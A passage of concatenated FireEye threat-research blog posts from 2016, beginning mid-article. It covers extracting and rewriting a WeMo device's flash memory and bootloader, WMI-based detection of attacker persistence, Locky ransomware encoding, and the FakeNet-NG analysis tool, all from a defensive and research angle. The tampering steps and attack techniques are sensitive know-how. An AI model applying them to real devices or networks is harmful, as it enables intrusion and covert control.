  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Chip pin layout</span></p>
 <p>To dump the flash memory from the chip, it must be powered by
  something. In this case, we utilize the bus pirate’s 3.3v line to
  provide power to the chip, as seen in Figure 6 and Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig6.jpeg"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Attaching the test clip to the chip</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig7.jpeg"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Full setup for dumping the memory with
    the Bus Pirate</span></p>
 <p>The problem with this is that, at times, voltage injection may occur
  and wake up other chips on the board. This means that other chips will
  communicate with our flash chip, interrupting our flash dumping
  process. This is why it is generally recommended to desolder the chip
  with a rework station and read the contents of the chip with a
  programmer. Thankfully, we were lucky and this was not the case. To
  dump the entire 16777232 bytes (exactly 16MB) worth of content from
  the flash chip, I utilized a tool called flashrom, which works well
  with the bus pirate device to extract the flash memory in full, as
  seen in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Dumping the content from the flash chip</span></p>
 <h5>Extract/Analyze the Firmware</h5>
 <p>Now that we have a flash dump from the device, we can use the tool
  binwalk to analyze the headers within the flash dump to get a better
  understanding of what the dump consists of, as seen in Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Binwalk analysis of the flash dump</span></p>
 <p>At first glance, we see that the device utilizes U-Boot as its
  bootloader (common for embedded Linux devices), and that there are
  several file system types such as SquashFS, JFFS2, and the like.
  Luckily, binwalk has a very neat feature that can automatically
  extract as much as it can identify from signatures in the flash dump
  and provide us with the full filesystem of the device. By running
  binwalk with the filesystem extraction flag (binwalk -e), we are
  presented with several filesystems, one of which is displayed in
  Figure 10.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: The extracted filesystem</span></p>
 <p>Within this directory, we can now take off our hardware reverse
  engineering hat and put on our software reverse engineering hat and
  begin looking for interesting items such as encryption keys used to
  sign WeMo device firmware, hashed root passwords, interesting services
  that may start on boot, etc.</p>
 <h5>Further Testing</h5>
 <p>What I found interesting after dumping the flash memory was that all
  of the memory was directly readable from the chip, and that the
  bootloader was bundled onto the same flash chip. This implies that,
  since there are no read controls on the flash chip as well as the
  bootloader existing on the same (potentially unprotected) chip, I
  might be able to write my own data to the device. I performed a few
  tests where I manipulated the flash dump binary itself, such as
  changing the serial of the device (which in turn changed the wireless
  broadcasting AP SSID). This initial test was to see if I could
  successfully modify part of the flash memory to display these changes
  in a real-world environment, this case being renaming the broadcast AP
  SSID, “WeMo.Bridge.HAK” as opposed to the original “WeMo.Bridge.CBD”,
  as seen in Figure 11.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Modified AP broadcast by the WeMo device</span></p>
 <p>I was encouraged in my efforts because I could write a new binary
  file to the device, completely overwriting the original content. To
  examine this further, I needed to make modifications to the flash dump
  and judge the results by viewing the startup console for the device.
  This involved connecting to the device’s UART debugging pads, as
  described earlier, and viewing the output of the console. To interact
  with the UART_TX pad, I used an alligator clip wrapped with electrical
  tape to hold down a wire that touched the pad and connected to my UART
  to USB device, attached to the UART_RX pin. It is important to note
  that since the device was plugged into an outlet and was already
  receiving power, that I only needed to connect to the transmission
  pad(s) as well as ground – but not power. This would have fried the
  device. As illustrated in Figure 12, I decided to connect the ground
  wire to the shielding, which already acts as a ground. This was much
  easier than attempting to connect the ground wire to the corresponding
  ground pad.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: Wiring the board to communicate via UART</span></p>
 <p>On the software side, I used the program baudrate.py to easily
  determine the baud rate (transmission rate) of the device via UART.
  After powering on the device and cycling through several garbled lines
  of text, I was met with a baud rate of 57600, which presented readable
  text, displaying the entire boot process of this device, as shown in
  Figure 13.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: WeMo device booting process displayed
    via UART</span></p>
 <p>I now had the ability to compare the strings found in the flash dump
  to what was displayed during the boot process of the device. To
  confirm my theory of potentially modifying the bootloader, I matched
  strings found in the binary to what was displayed in the console and
  attempted to modify those strings and rewrite this section of the
  bootloader, U-Boot. While using a hex editor to modify the binary file
  and flashrom to erase/write my file to the flash chip, I successfully
  modified the strings found in the bootloader process. I changed the
  bootloader header from “U-Boot 20140225_MFG (Feb 13 2015 - 16:58:37)”
  to “Mandiant Bootloader (May 18, 2016 – 15:38:25)”, as seen in Figure 14.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: Modified bootloader to display
    “Mandiant Bootloader” instead of “U-Boot 20140225_MFG”</span></p>
 <p>I was also able to modify various field names regarding the image
  verification process, most likely around the time where the bootloader
  checks the validity of the firmware, as seen in Figure 15.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/embedded%20hardware%20hacking%20gordon%20johnson/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: A modified field name to display “MandiantHak”</span></p>
 <p>The checks present in the image verification process are irrelevant
  if portions of the bootloader can be modified. In theory, if the above
  assertions are correct, an adversary could non-invasively rewrite a
  new, malicious bootloader and firmware to the device, with the ability
  to perform malicious acts on the user’s network as a trusted device.
  Such a scenario could consist of a reseller of this product placing a
  custom bootloader and firmware onto this device, and then selling the
  product to an unsuspecting customer, having a control point in the
  user’s network. This could theoretically enable an attacker to
  intercept traffic on the network, acquire data on the network, modify
  data, and more.</p>
 <h4>Remediation</h4>
 <p>The following recommendations do not take into consideration all of
  the variables that are involved when making significant changes to a
  device in order to implement security improvements. These
  recommendations are things to consider when attempting to remediate
  the aforementioned scenario.</p>
 <p>There are a few hardware-based actions that could be taken that
  would make it significantly more difficult for an adversary to
  read/write to the flash chip, among other areas. One such action is to
  implement hardware authentication chips. This involves storing a
  cryptographic mechanism on the board along with the required key for
  decryption, hindering an adversary’s ability to clone or tamper the
  data on the device. This is a cost-effective method for IoT device manufacturers.</p>
 <p>A second action is to protect the bootloader by storing it in
  protected storage or a SoC, or to require the SoC to communicate with
  an authentication chip during the boot process. The problem with
  implementing the bootloader on a flash chip that is unprotected and
  can be manipulated by disabling the CRC checks in place when
  decompressing the firmware image on boot and overwriting the image
  with a malicious one. If the bootloader must be stored on the flash
  chip, it could be included in OTP (One-Time Programmable) memory,
  disallowing this area to be written by a third party.</p>
 <h4>Conclusion</h4>
 <p>It is important to keep in mind the amount of attention paid to
  security is generally proportional to the value of the device.
  Implementing strict security features for a relatively inexpensive
  home automation system may not make sense for all but the most
  security-conscious consumer. That said, it is important to understand
  how easily an adversary can implement a malicious bootloader/firmware
  with a backdoor, allowing for command-and-control on devices we may
  rely on in our homes. A device as simple as a wireless light bulb can
  still be used as an entry point to our home systems.</p>
 <p>By taking the previously outlined steps to analyze an embedded
  device, we successfully identified relevant chips, a UART debugging
  port, and how to read and write raw data to the accessible flash chip,
  affecting the boot process of the device. Following the previously
  defined steps will help you further investigate most embedded devices
  in order to identify vulnerabilities.</p>
 <p>Upon notifying Belkin of our intention to release this research,
  they provided the following statement:</p>
 <p>“Wemo appreciates the work of FireEye and other white hat
  researchers who often play a critical role in identifying potential
  security issues and keeping connected devices safe for consumers. As
  malicious hackers grow more sophisticated, it is critical that we, and
  other smart home manufacturers, work with these groups to mitigate any
  serious threats to safety and security.</p>
 <p>“Though Wemo is aware of the potential vulnerability published by
  FireEye in their recent blogpost, we do not believe it is serious
  enough to warrant what would be a major change to our hardware
  production. In order to facilitate this attack scenario, a hacker
  would have to have physical access to a Wemo Link device, tamper with
  its circuitry and then either return the hacked device or resell it,
  both of which are extremely unlikely. With this particular
  vulnerability, there is no remote or even local network threat to
  users, so we believe that the best way to prevent this is to always
  purchase new, unopened merchandise from an official Wemo dealer.”</p>",http://www.fireeye.com/blog/threat-research/2016/08/embedded_hardwareha.html
WMI vs. WMI: Monitoring for Malicious Activity,"<h5>Hello my name is: WMI</h5>
 <p>WMI has been a core component of Windows since Windows 98, but it is
  not exactly old wine in a new bottle. WMI more closely resembles that
  bottle of ‘61 Bordeaux wine that continues to impress us as it ages
  and matures. WMI was developed as Microsoft’s interpretation of
  web-based enterprise management (WBEM) for system management and
  auditing; however, adversaries can use it for all stages of the Attack
  Lifecycle (shown in Figure 1), from creating the initial foothold on a
  system to stealing data from the environment and everything
  in-between. From an investigative perspective, WMI has only recently
  been used by a select few groups of attackers and it is an artifact
  that may be overlooked during investigations. Though WMI does not
  provide a default detailed tracing log<a name=""_ftnref1""></a>[1] of
  execution or persistence activity.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMIvsWMI%20tim%20parisi/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. The Attack Lifecycle</span></p>
 <p>In this blog post we will discuss how attackers can use WMI as a
  remote execution utility and as a persistence mechanism to execute
  malware, as well as what you can do to detect this activity at
  enterprise scale.</p>
 <h5>The Problem</h5>
 <p>We were recently onsite for a Red Teaming for Security Operations
  engagement, where our Red Team utilized WMI as a remote execution
  utility (similar to PsExec) and as a malware persistence mechanism
  (similar to a system service). We quickly realized that the client’s
  Security Operations Center (SOC) did not have the capabilities to
  detect this activity from both a network and endpoint perspective, so
  we opted to pause the red teaming activities and work with the client
  to identify a solution to this lack of visibility.</p>
 <h5>The Solution</h5>
 <p>We determined that following the attacker adage of “living off the
  land” was what we needed to solve the problem from a defense
  perspective. In other words, we leveraged WMI to monitor itself and
  feed WMI-invoked process creations and persistence activity directly
  into the system’s Application event log. This allowed our client the
  ability to feed these logs from endpoints into their SIEM and achieve
  greater visibility into their entire environment.</p>
 <p>To accomplish this, we created a WMI subscription. A subscription is
  the term used for WMI persistence, and it consists of the following
  three items:</p>
 <ol> <li>An Event Consumer: An action to perform upon triggering an
    event of interest</li> <li>An Event Filter: The event of
  interest</li> <li>A Filter to Consumer Binding: The registration
    mechanism that binds a filter to a consumer</li> </ol>
 <p>This WMI Subscription is similar to the Subscriptions created by
  attackers for persistence; however, we’re repurposing this method to
  perform a different type of action. Instead of executing malware when
  a condition is met, such as when the system uptime reaches 200
  seconds, we’re instructing WMI to log any newly created Consumers or
  WMI-induced process executions to the Application event log. We
  utilized PowerShell to configure WMI with these new instructions. At a
  high level, the PowerShell script performs the following:</p>
 <p>1.     Uses WMI Query Language (WQL) to identify:<br />     a.   
  Recently created “__EventConsumer” events (persistence
  mechanisms)<br />     b.    WMI-based process executions</p>
 <p>2.     Creates an Event Filter (condition), to perform an action if
  any of the above WQL conditions are true</p>
 <p>3.     Creates an Event Consumer (action), to log details of the
  newly created “__EventConsumer” or executed process<br />     a.    To
  log details, we call the “NTEventLogEventConsumer” WMI class that logs
  a custom message to the Application event log that contain the
  following details, depending on if this was a new Event Consumer or
  Process Creation:</p>
 <p>                                                  i.     Event
  Consumer Name<br />                                                  
  ii.     Event Consumer Command<br />                                
                    iii.     Process Call Method<br />                
                                    iv.     Process Call Command</p>
 <p>4.     Creates and registers the Binding, which associates the
  Condition to the Action</p>
 <h5>The Result</h5>
 <p>Figure 2 shows the general details of the newly created WMI Consumer
  that we aptly named “_EvilConsumer_” in the Application event log.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMIvsWMI%20tim%20parisi/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. General view of WMI Persistence event log</span></p>
 <p>Figure 3 shows the detailed view of the event log, which contains
  the Consumer Name and Command Executed for the creation of the new WMI
  Consumer “_EvilConsumer_”.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMIvsWMI%20tim%20parisi/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Detailed view of the WMI Persistence
    event log</span></p>
 <p>The following example illustrates another common use-case,
  demonstrating how attackers utilize WMI for process execution against
  remote systems. Figure 4 shows a command-line example of Windows
  Management Instrumentation Command-line (WMIC) usage to execute a
  remote PowerShell process. The command used the “Invoke-Expression”
  (IEX) cmdlet to download and execute the “execPayload.ps1” script over
  HTTP on the remote system “WIN-RD35VEB5LRT”.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMIvsWMI%20tim%20parisi/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. WMIC command used to execute
    PowerShell on WIN-RD35VEB5LRT</span></p>
 <p>Because the PowerShell process was ultimately executed via WMI, our
  WMI monitoring subscriber logged the process name and the process
  arguments. Figure 5 shows the general details of the WMI process
  execution in the Application event log on the victim system “WIN- RD35VEB5LRT”.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMIvsWMI%20tim%20parisi/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. General view of the WMI process
    creation event log</span></p>
 <p>Figure 6 shows the detailed view of the event log, which contains
  the command executed “powershell.exe” from the WMI-invoked process creation.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMIvsWMI%20tim%20parisi/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Detailed view of the WMI process
    creation event log</span></p>
 <h5>Monitoring in the Enterprise</h5>
 <p>Now that we can log newly created Event Consumers and processes
  spawned via WMI, we can take steps to make this more
  enterprise-friendly. Our client’s SOC used a third-party utility to
  inject log data into their SIEM. Our client could now feed the newly
  defined Application event logs into their SIEM and alert on these
  events to perform follow-up analysis. Environments of all sizes can
  follow these similar steps to enact this WMI persistence monitoring
  and alert on new events:</p>
 <ol> <li>Deploy the WMI monitoring PowerShell script to endpoints via
    GPO, SCCM or other third party utility. This creates a permanent WMI
    subscription that will monitor for newly created Event Consumers on
    endpoint systems.</li> <li>Push or pull the Application event logs
    that match the WMI persistence or process creation events using
    Snare or a similar utility into a SIEM.</li> <li>Alert on the WMI
    persistence or process creation logs through the SIEM. Note: some
    environments may heavily utilize WMI invoked process creations for
    system administration. In these cases, we recommend coordinating
    with your IT team to establish baselines for WMI activity, and only
    ingest anomalous events, such as process creations from
  “%SYSTEMDRIVE%\Windows\Temp”.</li> <li>Perform follow-up analysis on
    the system(s) with newly created WMI event consumers or process
  creations.</li> </ol>
 <p>This process provided an enterprise-friendly way to monitor and
  detect for certain WMI events in near-real time for our client,
  without having to perform endpoint forensic collection and analysis.</p>
 <h5>Download the Script</h5>
 <p>You can download the PowerShell script from the GitHub page <a href=""https://github.com/realparisi/WMI_Monitor"">here</a>. Note: You
  must run PowerShell as administrator before using the script. The
  script requires PowerShell version 3 or above (most recent is version
  5) and will run in its current state as two separate PowerShell
  functions. Figure 7 shows a screenshot of how to import the modules
  from the script and how to run each module.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/WMIvsWMI%20tim%20parisi/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Screenshot showing the import of the
    WMIMonitor script modules and running each module</span></p>
 <h5>An Acknowledgment</h5>
 <p>We would like to thank Matt Graeber (@mattifestation) for his help
  with developing Windows Management Instrumentation (WMI) as an
  Intrusion Detection System. We combined and modified two PowerShell
  scripts – originally developed by Matt – to alert on WMI Event
  Consumers and process creations and output details of these events
  directly to the Application event log. Matt Graeber’s WMI work that we
  used to identify and log malicious WMI actions can be found <a href=""https://gist.github.com/mattifestation/aff0cb8bf66c7f6ef44a#file-example_wmi_detection_eventlogalert-ps1"">here</a>
  and <a href=""https://gist.github.com/mattifestation/fa2e3cea76f70b1e2267#file-wmi_attack_detection-ps1-L183"">here</a>.</p>
 <p>
  <a name=""_ftn1""></a>[1] Windows 7 and above operating systems contain
  the WMI Activity Operational event log, however, this does not provide
  details of newly created Consumers, Filters or Bindings used for WMI persistence.</p>",http://www.fireeye.com/blog/threat-research/2016/08/wmi_vs_wmi_monitor.html
Locky Ransomware Distributed Via DOCM Attachments in Latest Email Campaigns,"<p>Throughout August, FireEye Labs has observed a few massive email
  campaigns distributing Locky ransomware. The campaigns have affected
  various industries, with the healthcare industry being hit the hardest
  based on our telemetry, as seen in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20ransomware%20Rongwhachong/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Top 10 affected industries</span></p>
 <p>Numerous countries are affected, with the United States, Japan, and
  Republic of Korea topping the list, as seen in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20ransomware%20Rongwhachong/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Top affected countries</span></p>
 <p>From our trend analysis seen in Figure 3, Locky ransomware started
  being delivered via DOCM format email attachments more extensively
  beginning in August. This marks a change from the large campaigns we
  observed in <a href=""https://www.fireeye.com/blog/threat-research/2016/03/surge_in_spam_campai.html"">March</a>,
  where a JavaScript based downloader was generally being used to infect systems.</p>
 <p>These detection spikes and change in tactics suggest that the
  cybercriminals are investing more to infect systems and maximize their
  profits. Additionally, we have observed that the delivery of Dridex
  via this distribution channel seems to have stopped, or nearly so,
  which could explain why we are seeing the Locky uptick.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20ransomware%20Rongwhachong/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Massive DOCM related campaigns on Aug.
    9, Aug. 11 and Aug. 15, 2016</span></p>
 <p>Our analysis showed high similarity in the macro code that was used
  in the Aug. 9, Aug. 11 and Aug. 15 campaigns. The following are the
  key comparisons:</p>
 <ol> <li>Each email campaign has a specific “one-off” campaign code
    that is used to download the Locky ransomware payload from the
    malicious malware server (see network pattern in Figure 4).</li>
    <li>The malicious URL embedded within macro code is encoded using
    the same encoding function, but with a different key for each
    campaign. Each character is encoded by multiplying its ASCII code
    with a specified key (an integer). Hence, its decoder would perform
    a division using the specified integer (see URL Decoder in Figure
  4).</li> <li>The downloaded payload is encoded using 32 bytes rolling
    XOR key. A different key is used for each campaign. Rolling XOR is
    described as follows:</li> </ol>
 <p>Plain [i] = Cipher [i] ^ Key [i % length of Key], where Plain is the
  computed plain text, Cipher is the cipher text, Key is the xor key,
  and i is the byte offset (see File Decoder in Figure 4).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20ransomware%20Rongwhachong/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Technical Overview</span></p>
 <p>The volume of Locky ransomware downloaders is increasing and the
  tools and techniques being used in campaigns are constantly changing.
  In this instance, we are seeing a shift from using a JavaScript based
  downloader to infect victims to using the DOCM format. On top of that,
  cybercrime trends have shown that attackers are distributing more
  ransomware these days than banking trojans, as the former appears to
  be more lucrative.</p>
 <p>These latest campaigns are a reminder that users must be cautious
  when it comes to opening attachments in emails or they run the risk of
  becoming infected and possibly disrupting business operations.</p>",http://www.fireeye.com/blog/threat-research/2016/08/locky_ransomwaredis.html
Analyzing the Malware Analysts – Inside FireEye’s FLARE Team,"<p>
  <img class=""float-left"" src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/podcast/podcasticon.png"" />At the Black Hat USA 2016 conference in Las Vegas
  last week, I was fortunate to sit down with Michael Sikorski,
  Director, FireEye Labs Advanced Reverse Engineering (FLARE) Team.</p>
 <p>During our conversation we discussed the origin of the FLARE team,
  what it takes to analyze malware, Michael’s book “<a href=""https://www.amazon.com/Practical-Malware-Analysis-Hands-Dissecting/dp/1593272901"">Practical
    Malware Analysis: The Hands-On Guide to Dissecting Malicious
  Software</a>,” and the latest open source freeware tools <a href=""https://github.com/fireeye/flare-floss"">FLOSS</a> and <a href=""https://github.com/fireeye/flare-fakenet-ng"">FakeNet-NG</a>.</p>
 <p>Listen to the full podcast <a href=""https://itunes.apple.com/us/podcast/eye-on-security/id1073779629?mt=2"">here</a>.</p>",http://www.fireeye.com/blog/threat-research/2016/08/analyzing_the_malwar.html
Overload: Critical Lessons from 15 Years of ICS Vulnerabilities,"<p>
  <img class=""float-left"" src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/ICS%20Vulnerabilities/hmi-malware.jpg"" /></p>
 <p>In the past several years, a flood of vulnerabilities has hit <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/mandiant-industrial-control-system-gap-assessment.html"">industrial
    control systems (ICS)</a> – the technological backbone of electric
  grids, water supplies, and production lines. These vulnerabilities
  affect the reliable operation of sensors, programmable controllers,
  software and networking equipment used to automate and monitor the
  physical processes that keep our modern world running.</p>
 <p>
  <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/dynamic-threat-intelligence.html"">FireEye
    iSIGHT Intelligence</a> has identified nearly 1,600 publicly
  disclosed ICS vulnerabilities since 2000. We go more in depth on these
  issues in our latest report, <i>
    <a href=""https://www2.fireeye.com/industrial-control-systems-vulnerability-trend-report-2016.html?utm_source=PSA&amp;utm_medium=blog&amp;utm_campaign=icstrendreport"">Overload:
      Critical Lessons from 15 Years of ICS Vulnerabilities</a></i>,
  which highlights trends in total ICS vulnerability disclosures, patch
  availability, vulnerable device type and vulnerabilities exploited in
  the wild.</p>
 <p>FireEye’s acquisition of iSIGHT provided tremendous visibility into
  the depth and breadth of vulnerabilities in the ICS landscape and how
  threat actors try to exploit them. To make matters worse, many of
  these vulnerabilities are left unpatched and some are simply
  unpatchable due to outdated technology, thus increasing the attack
  surface for potential adversaries. In fact, nation-state cyber threat
  actors have exploited five of these vulnerabilities in attacks since 2009.</p>
 <p>Unfortunately, security personnel from manufacturing, energy, water
  and other industries are often unaware of their own control system
  assets, not to mention the vulnerabilities that affect them. As a
  result, organizations operating these systems are missing the warnings
  and leaving their industrial environments exposed to potential threats.</p>
 <p>Click <a href=""https://www2.fireeye.com/industrial-control-systems-vulnerability-trend-report-2016.html?utm_source=PSA&amp;utm_medium=blog&amp;utm_campaign=icstrendreport"">here</a>
  to download the report and learn more.</p>",http://www.fireeye.com/blog/threat-research/2016/08/overload-critical-lessons-from-15-years-of-ics-vulnerabilities.html
FakeNet-NG: Next Generation Dynamic Network Analysis Tool,"<p>As a reverse engineer on the FLARE (FireEye Labs Advanced Reverse
  Engineering) team, I regularly perform basic dynamic analysis of
  malware samples. The goal is to quickly observe runtime
  characteristics by running binaries in a safe environment. One
  important task during dynamic analysis is to emulate the network
  environment and trick the malware into thinking it is connected to the
  Internet. When done right, the malware reveals its network signatures
  such as command and control (C2) domain names, User-Agent strings,
  URLs queried, and so on.</p>
 <p>One tool of choice is FakeNet. In this blog, I will discuss a major
  overhaul to FakeNet and how it helps you perform basic malware dynamic
  analysis. Some of the new features include full support for Windows
  Vista and later operating systems, process logging, advanced process
  and host traffic filtering engine, support for third party tools (e.g.
  debuggers, HTTP proxies, etc.) and many others.</p>
 <p>This blog covers the basic installation and most common scenarios
  for running FakeNet-NG. I invite you to review the complete
  documentation available <a href=""https://github.com/fireeye/flare-fakenet-ng"">here</a>.</p>
 <h5>Getting and Installing FakeNet-NG</h5>
 <p>The tool can be found on FLARE’s official Github repository <a href=""https://github.com/fireeye/flare-fakenet-ng/releases"">here</a>.</p>
 <p>From the releases page, download the latest pre-compiled archive.
  Next, copy the release archive to the Malware Analysis VM and extract
  it in an easily accessible location.</p>
 <h5>Running FakeNet-NG</h5>
 <p>The simplest way to run FakeNet-NG is to double click on
  fakenet64.exe or fakenet32.exe for the 64-bit or 32-bit versions of
  Windows, respectively, as illustrated in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Running FakeNet-NG</span></p>
 <p>The tool requires Administrator access, so you will have to confirm
  the UAC prompt requesting elevated privileges. Once launched you will
  see a console window similar to the one in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: FakeNet-NG Startup</span></p>
 <p>By default, FakeNet-NG is configured to start several most commonly
  used services:</p>
 <ul> <li>DNS Listener on UDP port 53</li> <li>HTTP Listener on TCP port
  80</li> <li>HTTPS Listener on TCP port 443</li> <li>SMTP Listener on
    TCP port 25</li> <li>Raw Binary Listener on both TCP and UDP ports
    1337. This service is also used as a default listener to handle all
    communications. Default listeners are explained below.</li> </ul>
 <p>At this point you are ready to run a malware sample and observe its
  behavior. Figure 3 illustrates sample malware communication to the C2 server.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Sample malware communication</span></p>
 <p>There are quite a few things going on in the log output above so
  let’s break it down into smaller components.</p>
 <p>Once launched, the malware attempts to resolve a C2 domain
  evil.mandiant.com by querying the configured DNS server 4.2.2.2.
  Figure 4 illustrates how FakeNet-NG diverts the traffic from 4.2.2.2
  to the local machine’s IP address 172.16.163.131.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Diverting DNS traffic</span></p>
 <p>A major benefit of running FakeNet-NG on the same host as the
  malware is that it can perform additional analysis of running
  executables. For example, FakeNet-NG is capable of detecting the exact
  executable name that is generating traffic. In this case, we can see
  that level1_payload.exe is generating the above DNS traffic.</p>
 <p>Continuing with the analysis, Figure 5 shows FakeNet-NG’s DNS
  listener providing a fake response to the query pointing malware to a
  fake C2 IP address 192.0.2.123.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Faking DNS response</span></p>
 <p>After successfully resolving the domain, the malware proceeds to
  communicate with the C2 domain name, as shown in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Faking C2 communication</span></p>
 <p>FakeNet-NG implements a few popular network listeners. In this case,
  the malware is communicating using the HTTP protocol on port 80. The
  output above provides us with several good network indicators such as
  the exact URL requested and User-Agent used in the communication, as
  well as the unencrypted beacon payload containing the compromised
  host’s machine name. All of these indicators can be used to create
  good network signatures to detect this malware sample.</p>
 <p>By default, FakeNet-NG captures all of the intercepted traffic in
  PCAP files so you can perform additional analysis. For example, Figure
  7 shows both original and diverted packets performing DNS resolution
  as well as HTTP POST requests to the C2 server.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Wireshark PCAP</span></p>
 <p>Captured PCAP files are stored in the same directory as the
  FakeNet-NG’s executable. As an added logging feature, FakeNet-NG will
  also preserve complete HTTP POST payloads in separate text files also
  stored in the executable’s working path.</p>
 <h5>Configuring FakeNet-NG</h5>
 <p>By default, FakeNet-NG is configured to cover the majority of
  malware analysis scenarios. However, if you encounter a more complex
  sample, then you can easily adapt the tool by editing one of the few
  configuration files located in the configs directory. By default,
  FakeNet-NG loads default.ini configuration file when it loads. You can
  either modify that file or create a new one and point FakeNet-NG to
  load it with the –c command-line parameter. Consider a sample
  scenario, where you have malware communicating using a binary protocol
  on port 4444. Figure 8 illustrates a sample listener configuration
  that will fake this service.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig8.png"" /></p>
 <p>Figure 8: Custom Listener Configuration</p>
 <p>The key elements of the configuration above are <i>Port</i>,
    <i>Protocol </i>and <i>Listener</i>. <i>Port</i> and <i>Protocol</i>
  attributes define the port and protocol used to both setup the
  listener service and define the rule to divert traffic. The
  <i>Listener</i> attribute is used to define a specific listener class.
  In this case, <i>RawListener</i> is used to handle arbitrary binary
  protocols. Alternatively, if you wanted to setup a listener to handle
  HTTP or HTTPS traffic you would use <i>HTTPListener</i> instead.
  Please refer to the documentation for a complete list of supported
  listeners and available options.</p>
 <p>With the above configuration appended to the active configuration
  file, we can now launch FakeNet-NG and intercept traffic destined to
  TCP port 4444, as shown in Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FakeNet/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Diverting to Custom Listener</span></p>
 <p>The scenario above was for a single, known port that the malware
  would use for its communication. In many cases it is hard to predict
  the exact port used from basic static or dynamic analysis. Instead,
  let’s use another powerful feature that essentially allows you to
  handle any traffic to any port by a default listener. In order to
  configure the default listener, edit the [Diverter] section in the
  configuration file as follows in Figure 10.</p>
 <p>
